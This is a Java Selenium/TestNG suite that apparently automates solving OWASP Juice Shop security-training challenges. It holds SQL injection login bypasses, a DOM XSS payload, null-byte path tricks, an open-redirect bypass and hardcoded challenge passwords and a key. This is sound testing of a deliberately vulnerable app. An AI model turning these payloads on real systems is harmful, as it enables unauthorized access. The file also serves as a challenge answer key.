
package tests.JuiceShop;

import automation.ZapManager;
import org.openqa.selenium.Alert;
import org.openqa.selenium.support.ui.ExpectedConditions;
import org.openqa.selenium.support.ui.WebDriverWait;
import org.testng.Assert;
import org.testng.SkipException;
import org.testng.annotations.BeforeMethod;
import org.testng.annotations.Test;
import pom.JuiceShop.AdministrationPage;
import pom.JuiceShop.LoginPage;
import pom.JuiceShop.PrivacyPolicyPage;
import pom.JuiceShop.ResourcePage;
import pom.JuiceShop.ScoreBoardPage;
import pom.JuiceShop.SearchPage;
import utilities.JuiceShop.JuiceShopApi;
import utilities.JuiceShop.JuiceShopChallengeActions;
import utilities.ScreenshotManager;

import java.net.URI;
import java.time.Duration;

public class JuiceShopChallengesTest extends JuiceShopBaseTest {

    private JuiceShopApi api;
    private JuiceShopChallengeActions actions;

    @BeforeMethod
    public void prepareChallengeUtilities() {
        api = new JuiceShopApi(baseUrl);
        actions = new JuiceShopChallengeActions(api);
    }

    @Test(priority = 1)
    public void testSqlInjectionLoginBypass() {
        var driver = ZapManager.getDriver();
        LoginPage loginPage = new LoginPage(driver);
        loginPage.loginFromHome(baseUrl, "admin@juice-sh.op'--", "anything");

        ScreenshotManager.capture(driver);
        Assert.assertTrue(loginPage.isUserLoggedIn(), "SQL Injection authentication bypass failed: user is not logged in.");
    }

    @Test(priority = 2)
    public void testDomXssChallenge() {
        var driver = ZapManager.getDriver();
        SearchPage searchPage = new SearchPage(driver);
        searchPage.searchFromHome(baseUrl, "<iframe src=\"javascript:alert(`xss`)\">");

        Alert alert = new WebDriverWait(driver, Duration.ofSeconds(10)).until(ExpectedConditions.alertIsPresent());
        Assert.assertEquals(alert.getText(), "xss", "DOM XSS payload did not execute correctly.");
        alert.accept();

        ScreenshotManager.capture(driver);
        System.out.println("DOM XSS payload executed successfully.");
    }

    @Test(priority = 3)
    public void testConfidentialDocumentChallenge() throws Exception {
        var response = api.get("/ftp/acquisitions.md");
        ScreenshotManager.captureResponse(ZapManager.getDriver(), response);

        Assert.assertEquals(response.statusCode(), 200, "Confidential document was not accessible.");
        Assert.assertFalse(response.body().isBlank(), "Confidential document was empty.");
        assertChallengeSolved("Confidential Document");
    }

    @Test(priority = 4)
    public void testExposedMetricsChallenge() throws Exception {
        var response = api.get("/metrics");
        System.out.println("Metrics status: " + response.statusCode());
        System.out.println("Metrics URL: " + response.request().uri());
        Assert.assertEquals(response.statusCode(), 200);
        Assert.assertTrue(response.body().contains("# HELP"));

        var driver = ZapManager.getDriver();
        new ScoreBoardPage(driver).open(baseUrl);
        ScreenshotManager.capture(driver);
        assertChallengeSolved("Exposed Metrics");
    }

    @Test(priority = 5)
    public void testAdminSectionChallenge() throws Exception {
        var driver = ZapManager.getDriver();
        new LoginPage(driver).loginFromHome(baseUrl, "admin@juice-sh.op'--", "anything");
        new AdministrationPage(driver).open(baseUrl);

        ScreenshotManager.capture(driver);
        assertChallengeSolved("Admin Section");
    }

    @Test(priority = 6)
    public void testSecurityPolicyChallenge() throws Exception {
        var driver = ZapManager.getDriver();
        ResourcePage resource = new ResourcePage(driver);
        resource.open(URI.create(baseUrl).resolve("/.well-known/security.txt").toString());
        Assert.assertTrue(resource.bodyText().contains("Contact:"), "Security policy was not retrieved.");

        ScreenshotManager.capture(driver);
        assertChallengeSolved("Security Policy");
    }

    @Test(priority = 7)
    public void testMissingEncodingChallenge() throws Exception {
        var driver = ZapManager.getDriver();
        String path = "/assets/public/images/uploads/" +
                "%E1%93%9A%E1%98%8F%E1%97%A2-%23zatschi-%23whoneedsfourlegs-1572600969477.jpg";
        new ResourcePage(driver).open(URI.create(baseUrl).resolve(path).toString());
        Assert.assertTrue(driver.getCurrentUrl().contains("%23zatschi"), "Encoded image request was not made.");

        ScreenshotManager.capture(driver);
        assertChallengeSolved("Missing Encoding");
    }

    @Test(priority = 8)
    public void testExtraLanguageChallenge() throws Exception {
        var driver = ZapManager.getDriver();
        new ResourcePage(driver).open(URI.create(baseUrl).resolve("/assets/i18n/tlh_AA.json").toString());

        ScreenshotManager.capture(driver);
        assertChallengeSolved("Extra Language");
    }

    @Test(priority = 9)
    public void testPrivacyPolicyChallenge() throws Exception {
        var driver = ZapManager.getDriver();
        new PrivacyPolicyPage(driver).open(baseUrl);

        ScreenshotManager.capture(driver);
        assertChallengeSolved("Privacy Policy");
    }

    @Test(priority = 11)
    public void testErrorHandlingChallenge() throws Exception {
        var driver = ZapManager.getDriver();
        ResourcePage resource = new ResourcePage(driver);
        resource.open(URI.create(baseUrl).resolve("/rest/products/search?q=%27%3B").toString());
        resource.waitForBodyText("SQLITE_ERROR", 10);

        ScreenshotManager.capture(driver);
        assertChallengeSolved("Error Handling");
    }

    @Test(priority = 12)
    public void testPasswordStrengthChallenge() throws Exception {
        var driver = ZapManager.getDriver();
        LoginPage loginPage = new LoginPage(driver);
        loginPage.loginFromHome(baseUrl, "admin@juice-sh.op", "admin123");
        Assert.assertTrue(loginPage.isUserLoggedIn(), "Administrator login failed.");

        ScreenshotManager.capture(driver);
        assertChallengeSolved("Password Strength");
    }

    @Test(priority = 13)
    public void testLoginBenderChallenge() throws Exception {
        var driver = ZapManager.getDriver();
        LoginPage loginPage = new LoginPage(driver);
        loginPage.loginFromHome(baseUrl, "bender@juice-sh.op'--", "anything");
        Assert.assertTrue(loginPage.isUserLoggedIn(), "Bender login bypass failed.");

        ScreenshotManager.capture(driver);
        assertChallengeSolved("Login Bender");
    }

    @Test(priority = 14)
    public void testLoginJimChallenge() throws Exception {
        var driver = ZapManager.getDriver();
        LoginPage loginPage = new LoginPage(driver);
        loginPage.loginFromHome(baseUrl, "jim@juice-sh.op'--", "anything");
        Assert.assertTrue(loginPage.isUserLoggedIn(), "Jim login bypass failed.");

        ScreenshotManager.capture(driver);
        assertChallengeSolved("Login Jim");
    }

    @Test(priority = 15)
    public void testAccessLogChallenge() throws Exception {
        var driver = ZapManager.getDriver();
        ResourcePage resource = new ResourcePage(driver);
        resource.open(baseUrl + "/support/logs/");
        String logUrl = resource.findLinkContaining("access.log", 15);
        Assert.assertNotNull(logUrl, "No access log link was found.");

        ScreenshotManager.capture(driver);
        resource.open(logUrl);
        assertChallengeSolved("Access Log");
    }

    @Test(priority = 16)
    public void testMisplacedIaCFilesChallenge() throws Exception {
        var driver = ZapManager.getDriver();
        ResourcePage resource = new ResourcePage(driver);
        resource.open(baseUrl + "/infrastructure/terraform/main.tf");
        resource.waitForBodyText("provider", 15);
        Assert.assertTrue(resource.bodyText().contains("resource"), "Terraform configuration was not exposed.");

        ScreenshotManager.capture(driver);
        assertChallengeSolved("Misplaced IaC Files");
    }

    @Test(priority = 17)
    public void testBonusPayloadChallenge() throws Exception {
        var driver = ZapManager.getDriver();
        SearchPage searchPage = new SearchPage(driver);
        String payload = "<iframe width=\"100%\" height=\"166\" scrolling=\"no\" frameborder=\"no\" allow=\"autoplay\" "
                + "src=\"https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076"
                + "&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true"
                + "&show_reposts=false&show_teaser=true\"></iframe>";

        searchPage.searchFromHome(baseUrl, payload);
        searchPage.waitForSoundCloudPlayer();

        ScreenshotManager.capture(driver);
        assertChallengeSolved("Bonus Payload");
    }

    @Test(priority = 18)
    public void testEasterEggChallenge() throws Exception {
        var driver = ZapManager.getDriver();
        ResourcePage ftp = new ResourcePage(driver);
        ftp.open(baseUrl + "/ftp/");
        ftp.findLinkContaining("eastere.gg", 15);

        var response = api.get("/ftp/eastere.gg%2500.md");
        Assert.assertEquals(response.statusCode(), 200, "Easter Egg file was not accessible.");

        ScreenshotManager.captureResponse(driver, response);
        assertChallengeSolved("Easter Egg");
    }

    @Test(priority = 19)
    public void testPoisonNullByteChallenge() throws Exception {
        var driver = ZapManager.getDriver();
        ResourcePage ftp = new ResourcePage(driver);
        ftp.open(baseUrl + "/ftp/");
        ftp.findLinkContaining("package.json.bak", 15);

        var response = api.get("/ftp/package.json.bak%2500.md");
        System.out.println("[POISON NULL BYTE] Content type: " + response.headers().firstValue("content-type").orElse("unknown"));
        System.out.println("[POISON NULL BYTE] Response length: " + response.body().length());
        Assert.assertEquals(response.statusCode(), 200, "Developer backup request did not return HTTP 200.");

        ScreenshotManager.captureResponse(driver, response);
        assertChallengeSolved("Forgotten Developer Backup");
        assertChallengeSolved("Poison Null Byte");
    }

    @Test(priority = 20)
    public void testForgottenSalesBackupChallenge() throws Exception {
        var response = api.get("/ftp/coupons_2013.md.bak%2500.pdf");
        Assert.assertEquals(response.statusCode(), 200, "Sales backup was not accessible.");

        ScreenshotManager.captureResponse(ZapManager.getDriver(), response);
        assertChallengeSolved("Forgotten Sales Backup");
    }

    @Test(priority = 21)
    public void testMisplacedSignatureFileChallenge() throws Exception {
        var response = api.get("/ftp/suspicious_errors.yml%2500.md");
        Assert.assertEquals(response.statusCode(), 200, "SIEM signature file was not accessible.");

        ScreenshotManager.captureResponse(ZapManager.getDriver(), response);
        assertChallengeSolved("Misplaced Signature File");
    }

    @Test(priority = 22)
    public void testOutdatedAllowlistChallenge() throws Exception {
        var driver = ZapManager.getDriver();
        String destination = "https://blockchain.info/address/1AbKfgvw9psQ41NbLi8kufDQTezwG8DRZm";
        var response = api.get("/redirect?to=" + destination);
        String location = response.headers().firstValue("location").orElse("");
        Assert.assertEquals(response.statusCode(), 302, "Expected a redirect response.");
        Assert.assertEquals(location, destination, "Unexpected redirect destination.");

        ScreenshotManager.captureResponse(driver, response);
        assertChallengeSolved("Outdated Allowlist");
    }

    @Test(priority = 23)
    public void testPrivacyPolicyInspectionChallenge() throws Exception {
        var driver = ZapManager.getDriver();
        driver.get(baseUrl + "/we/may/also/instruct/you/to/refuse/all/reasonably/necessary/responsibility");
        assertChallengeSolved("Privacy Policy Inspection");

        boolean imageAvailable = false;
        try {
            var response = api.get("/assets/private/thank-you.jpg");
            String contentType = response.headers().firstValue("Content-Type").orElse("");
            imageAvailable = response.statusCode() == 200 && contentType.toLowerCase().startsWith("image/");
        } catch (Exception e) {
            System.out.println("[PRIVACY POLICY] Image request failed: " + e.getMessage());
        }

        new PrivacyPolicyPage(driver).showInspectionEvidence(baseUrl, imageAvailable);
        ScreenshotManager.capture(driver);
    }

    @Test(priority = 24)
    public void testRepetitiveRegistrationChallenge() throws Exception {
        var response = actions.registerWithMismatchedPasswords();
        ScreenshotManager.captureResponse(ZapManager.getDriver(), response);
        assertChallengeSolved("Repetitive Registration");
    }

    @Test(priority = 25)
    public void testEmptyUserRegistrationChallenge() throws Exception {
        var response = actions.registerEmptyUser();
        ScreenshotManager.captureResponse(ZapManager.getDriver(), response);
        assertChallengeSolved("Empty User Registration");
    }

    @Test(priority = 26)
    public void testViewBasketChallenge() throws Exception {
        var result = actions.viewAnotherBasket();
        System.out.println("[VIEW BASKET] Authenticated basket: " + result.ownBasketId());
        System.out.println("[VIEW BASKET] Requested basket: " + result.targetBasketId());
        Assert.assertNotEquals(result.targetBasketId(), result.ownBasketId(), "Target belongs to the authenticated user.");
        Assert.assertEquals(result.response().statusCode(), 200, "Another user's basket was not accessible.");

        ScreenshotManager.captureResponse(ZapManager.getDriver(), result.response());
        assertChallengeSolved("View Basket");
    }

    @Test(priority = 27)
    public void testForgedFeedbackChallenge() throws Exception {
        var result = actions.submitForgedFeedback();
        System.out.println("[FORGED FEEDBACK] Authenticated user: " + result.authenticatedUserId());
        System.out.println("[FORGED FEEDBACK] Submitted as user: " + result.forgedUserId());
        Assert.assertNotEquals(result.forgedUserId(), result.authenticatedUserId(), "Feedback must reference another user.");
        Assert.assertEquals(result.response().statusCode(), 201, "Forged feedback was not accepted.");

        ScreenshotManager.captureResponse(ZapManager.getDriver(), result.response());
        assertChallengeSolved("Forged Feedback");
    }

    @Test(priority = 28)
    public void testFiveStarFeedbackChallenge() throws Exception {
        var result = actions.removeFiveStarFeedback();
        Assert.assertFalse(result.fiveStarsRemain(), "Five-star customer feedback still exists.");
        System.out.println("[FIVE-STAR FEEDBACK] Entries removed: " + result.deletedCount());

        ScreenshotManager.captureResponse(ZapManager.getDriver(), result.response());
        assertChallengeSolved("Five-Star Feedback");
    }

    @Test(priority = 29)
    public void testWeb3SandboxChallenge() throws Exception {
        var driver = ZapManager.getDriver();
        driver.get(baseUrl + "/#/web3-sandbox");
        ScreenshotManager.capture(driver);
        assertChallengeSolved("Web3 Sandbox");
    }

    @Test(priority = 30)
    public void testAdminRegistrationChallenge() throws Exception {
        var response = actions.registerWithAdminRole();
        ScreenshotManager.captureResponse(ZapManager.getDriver(), response);
        assertChallengeSolved("Admin Registration");
    }

    @Test(priority = 31)
    public void testZeroStarsChallenge() throws Exception {
        var response = actions.submitZeroStarFeedback();
        ScreenshotManager.captureResponse(ZapManager.getDriver(), response);
        assertChallengeSolved("Zero Stars");
    }

    @Test(priority = 32)
    public void testForgedReviewChallenge() throws Exception {
        var response = actions.submitForgedProductReview();
        ScreenshotManager.captureResponse(ZapManager.getDriver(), response);
        assertChallengeSolved("Forged Review");
    }

    @Test(priority = 33)
    public void testLoginMcSafeSearchChallenge() throws Exception {
        var driver = ZapManager.getDriver();
        new LoginPage(driver).loginFromHome(baseUrl, "mc.safesearch@juice-sh.op", "Mr. N00dles");
        ScreenshotManager.capture(driver);
        assertChallengeSolved("Login MC SafeSearch");
    }

    @Test(priority = 34)
    public void testLoginAmyChallenge() throws Exception {
        var driver = ZapManager.getDriver();
        new LoginPage(driver).loginFromHome(baseUrl, "amy@juice-sh.op", "K1f.....................");
        ScreenshotManager.capture(driver);
        assertChallengeSolved("Login Amy");
    }

    @Test(priority = 35)
    public void testPasswordHashLeakChallenge() throws Exception {
        var driver = ZapManager.getDriver();
        new LoginPage(driver).loginFromHome(baseUrl, "admin@juice-sh.op", "admin123");
        ResourcePage resource = new ResourcePage(driver);
        resource.open(baseUrl + "/rest/user/whoami?fields=password");
        ScreenshotManager.capture(driver);
        assertChallengeSolved("Password Hash Leak");
    }

    @Test(priority = 36)
    public void testEmailLeakChallenge() throws Exception {
        var response = api.get("/rest/user/whoami?callback=leak");
        ScreenshotManager.captureResponse(ZapManager.getDriver(), response);
        assertChallengeSolved("Email Leak");
    }

    @Test(priority = 37)
    public void testWeirdCryptoChallenge() throws Exception {
        var response = actions.submitCryptoComplaint();
        ScreenshotManager.captureResponse(ZapManager.getDriver(), response);
        assertChallengeSolved("Weird Crypto");
    }

    @Test(priority = 38)
    public void testVulnerableLibraryChallenge() throws Exception {
        var response = actions.submitVulnerableLibraryComplaint();
        ScreenshotManager.captureResponse(ZapManager.getDriver(), response);
        assertChallengeSolved("Vulnerable Library");
    }

    @Test(priority = 39)
    public void testNestedEasterEggChallenge() throws Exception {
        var response = actions.retrieveNestedEasterEgg();
        ScreenshotManager.captureResponse(ZapManager.getDriver(), response);
        Assert.assertEquals(response.statusCode(), 200);
        assertChallengeSolved("Nested Easter Egg");
    }

    @Test(priority = 40)
    public void testRetrieveBlueprintChallenge() throws Exception {
        var response = actions.retrieveBlueprint();
        ScreenshotManager.captureResponse(ZapManager.getDriver(), response);
        Assert.assertEquals(response.statusCode(), 200);
        assertChallengeSolved("Retrieve Blueprint");
    }

    @Test(priority = 41)
    public void testBlockchainHypeChallenge() throws Exception {
        var driver = ZapManager.getDriver();
        driver.get(baseUrl + "/#/tokensale-ico-ea");
        ScreenshotManager.capture(driver);
        assertChallengeSolved("Blockchain Hype");
    }

    @Test(priority = 42)
    public void testPremiumPaywallChallenge() throws Exception {
        var response = actions.openPremiumPage();
        ScreenshotManager.captureResponse(ZapManager.getDriver(), response);
        Assert.assertEquals(response.statusCode(), 200);
        assertChallengeSolved("Premium Paywall");
    }

    @Test(priority = 43)
    public void testImaginaryChallenge() throws Exception {
        var response = actions.applyImaginaryContinueCode();
        ScreenshotManager.captureResponse(ZapManager.getDriver(), response);
        assertChallengeSolved("Imaginary Challenge");
    }

    @Test(priority = 44)
    public void testAllowlistBypassChallenge() throws Exception {
        var response = actions.bypassRedirectAllowlist();
        ScreenshotManager.captureResponse(ZapManager.getDriver(), response);
        Assert.assertEquals(response.statusCode(), 302);
        assertChallengeSolved("Allowlist Bypass");
    }

    @Test(priority = 45)
    public void testLegacyTyposquattingChallenge() throws Exception {
        var response = actions.submitFeedback("Suspect dependency: epilogue-js");
        ScreenshotManager.captureResponse(ZapManager.getDriver(), response);
        assertChallengeSolved("Legacy Typosquatting");
    }

    @Test(priority = 46)
    public void testFrontendTyposquattingChallenge() throws Exception {
        var response = actions.submitFeedback("Suspect frontend module: ngy-cookie");
        ScreenshotManager.captureResponse(ZapManager.getDriver(), response);
        assertChallengeSolved("Frontend Typosquatting");
    }

    @Test(priority = 47)
    public void testSteganographyChallenge() throws Exception {
        var response = actions.submitFeedback("The hidden character is Pickle Rick");
        ScreenshotManager.captureResponse(ZapManager.getDriver(), response);
        assertChallengeSolved("Steganography");
    }

    @Test(priority = 48)
    public void testSupplyChainAttackChallenge() throws Exception {
        var response = actions.submitFeedback("https://github.com/eslint/eslint-scope/issues/39");
        ScreenshotManager.captureResponse(ZapManager.getDriver(), response);
        assertChallengeSolved("Supply Chain Attack");
    }

    @Test(priority = 49)
    public void testLeakedUnsafeProductChallenge() throws Exception {
        var response = actions.submitFeedback("Rippertuer Special Juice contains unsafe ingredients: Eurogium Edule and Hueteroneel");
        ScreenshotManager.captureResponse(ZapManager.getDriver(), response);
        assertChallengeSolved("Leaked Unsafe Product");
    }

    @Test(priority = 50)
    public void testProductTamperingChallenge() throws Exception {
        var response = actions.tamperWithProductDescription();

        Assert.assertEquals(response.statusCode(), 200, "Product description update failed.");

        ScreenshotManager.captureResponse(ZapManager.getDriver(), response);
        actions.waitForChallenge("Product Tampering");
        assertChallengeSolved("Product Tampering");
    }

    @Test(priority = 51)
    public void testNoSqlManipulationChallenge() throws Exception {
        var response = actions.updateAllReviewsViaNoSql();
        ScreenshotManager.captureResponse(ZapManager.getDriver(), response);
        assertChallengeSolved("NoSQL Manipulation");
    }

    @Test(priority = 52)
    public void testDatabaseSchemaChallenge() throws Exception {
        var response = actions.retrieveDatabaseSchema();

        Assert.assertEquals(response.statusCode(), 200, "Database schema request failed.");
        Assert.assertTrue(response.body().contains("CREATE TABLE"),
                "Database schema was not returned.");

        ScreenshotManager.captureResponse(ZapManager.getDriver(), response);
        actions.waitForChallenge("Database Schema");
        assertChallengeSolved("Database Schema");
    }

    @Test(priority = 53)
    public void testUserCredentialsChallenge() throws Exception {
        var response = actions.retrieveUserCredentials();
        ScreenshotManager.captureResponse(ZapManager.getDriver(), response);
        Assert.assertEquals(response.statusCode(), 200);
        assertChallengeSolved("User Credentials");
    }

    // This test is disabled in Docker Environments
    @Test(priority = 54, enabled = false)
    public void testNoSqlExfiltrationChallenge() throws Exception {
        var response = actions.exfiltrateOrdersViaNoSql();
        ScreenshotManager.captureResponse(ZapManager.getDriver(), response);
        if (!api.isChallengeSolved("NoSQL Exfiltration"))
            throw new SkipException("NoSQL Exfiltration is disabled in the Juice Shop Docker environment.");
        assertChallengeSolved("NoSQL Exfiltration");
    }

    @Test(priority = 55)
    public void testCaptchaBypassChallenge() throws Exception {
        var response = actions.submitRapidFeedback(12);
        ScreenshotManager.captureResponse(ZapManager.getDriver(), response);
        assertChallengeSolved("CAPTCHA Bypass");
    }

    @Test(priority = 56)
    public void testMultipleLikesChallenge() throws Exception {
        var responses = actions.likeReviewConcurrently();
        Assert.assertEquals(responses.size(), 3, "Expected three review-like requests.");
        ScreenshotManager.captureResponse(ZapManager.getDriver(), responses.get(0));
        assertChallengeSolved("Multiple Likes");
    }

    @Test(priority = 57)
    public void testUploadTypeChallenge() throws Exception {
        var response = actions.uploadUnexpectedFileType();
        ScreenshotManager.captureResponse(ZapManager.getDriver(), response);
        assertChallengeSolved("Upload Type");
    }

    @Test(priority = 58)
    public void testUploadSizeChallenge() throws Exception {
        var response = actions.uploadOversizedPdf();
        ScreenshotManager.captureResponse(ZapManager.getDriver(), response);
        assertChallengeSolved("Upload Size");
    }

    @Test(priority = 59)
    public void testDeprecatedInterfaceChallenge() throws Exception {
        var response = actions.useDeprecatedXmlUpload();
        ScreenshotManager.captureResponse(ZapManager.getDriver(), response);
        assertChallengeSolved("Deprecated Interface");
    }

    @Test(priority = 61)
    public void testCrossSiteImagingChallenge() throws Exception {
        var driver = ZapManager.getDriver();
        new LoginPage(driver).loginFromHome(baseUrl, "admin@juice-sh.op", "admin123");

        driver.get(actions.crossSiteImagingUrl(baseUrl));

        actions.waitForChallenge("Cross-Site Imaging");
        ScreenshotManager.capture(driver);
        assertChallengeSolved("Cross-Site Imaging");
    }

    @Test(priority = 62)
    public void testLoginBjoernChallenge() throws Exception {
        var driver = ZapManager.getDriver();
        new LoginPage(driver).loginFromHome(baseUrl, "bjoern.kimminich@gmail.com", "bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI=");
        ScreenshotManager.capture(driver);
        assertChallengeSolved("Login Bjoern");
    }

    @Test(priority = 63)
    public void testLoginSupportTeamChallenge() throws Exception {
        var driver = ZapManager.getDriver();
        new LoginPage(driver).loginFromHome(baseUrl, "support@juice-sh.op", "J6aVjTgOpRs@?5l!Zkq2AYnCE@RF$P");
        ScreenshotManager.capture(driver);
        assertChallengeSolved("Login Support Team");
    }

    @Test(priority = 64)
    public void testGdprDataErasureChallenge() throws Exception {
        var driver = ZapManager.getDriver();
        new LoginPage(driver).loginFromHome(baseUrl, "chris.pike@juice-sh.op'--", "anything");
        ScreenshotManager.capture(driver);
        assertChallengeSolved("GDPR Data Erasure");
    }

    @Test(priority = 65)
    public void testEphemeralAccountantChallenge() throws Exception {
        var driver = ZapManager.getDriver();
        new LoginPage(driver).loginFromHome(baseUrl, actions.ephemeralAccountantLogin(), "anything");
        ScreenshotManager.capture(driver);
        assertChallengeSolved("Ephemeral Accountant");
    }

    @Test(priority = 66)
    public void testLeakedApiKeyChallenge() throws Exception {
        var response = actions.submitFeedback(
                "A leaked API key was identified: 6PPi37DBxP4lDwlriuaxP15HaDJpsUXY5TspVmie"
        );

        ScreenshotManager.captureResponse(ZapManager.getDriver(), response);
        actions.waitForChallenge("Leaked API Key");
        assertChallengeSolved("Leaked API Key");
    }

    @Test(priority = 67)
    public void testVulnerableInfrastructureChallenge() throws Exception {
        var response = actions.submitFeedback(
                "Security finding: The infrastructure references the vulnerable Docker image mongo:4.4.29."
        );

        ScreenshotManager.captureResponse(ZapManager.getDriver(), response);
        actions.waitForChallenge("Vulnerable Infrastructure");
        assertChallengeSolved("Vulnerable Infrastructure");
    }

    @Test(priority = 68)
    public void testManipulateBasketChallenge() throws Exception {
        var response = actions.addProductToAnotherBasket();

        ScreenshotManager.captureResponse(ZapManager.getDriver(), response);
        Assert.assertTrue(response.statusCode() == 200 || response.statusCode() == 201,
                "Basket manipulation request failed. HTTP " + response.statusCode());
        assertChallengeSolved("Manipulate Basket");
    }

    @Test(priority = 999)
    public void testMassDispelChallenge() throws Exception {
        var driver = ZapManager.getDriver();
        driver.get(baseUrl);
        new LoginPage(driver).dismissInitialOverlays();

        actions.dismissChallengeNotifications(driver);
        actions.waitForChallenge("Mass Dispel");

        ScreenshotManager.capture(driver);
        assertChallengeSolved("Mass Dispel");
    }

    @Test(priority = 1000)
    public void testScoreBoardChallenge() throws Exception {
        var driver = ZapManager.getDriver();
        driver.get(baseUrl);
        new LoginPage(driver).dismissInitialOverlays();

        ScoreBoardPage scoreBoard = new ScoreBoardPage(driver);
        scoreBoard.open(baseUrl);
        Assert.assertTrue(scoreBoard.isOpen(), "Score Board page did not load.");

        ScreenshotManager.capture(driver);
        assertChallengeSolved("Score Board");
    }

    private void assertChallengeSolved(String challengeName) throws Exception {
        Assert.assertTrue(api.isChallengeSolved(challengeName), "Challenge not completed: " + challengeName);
        System.out.println("[SOLVED] " + challengeName);
    }
}
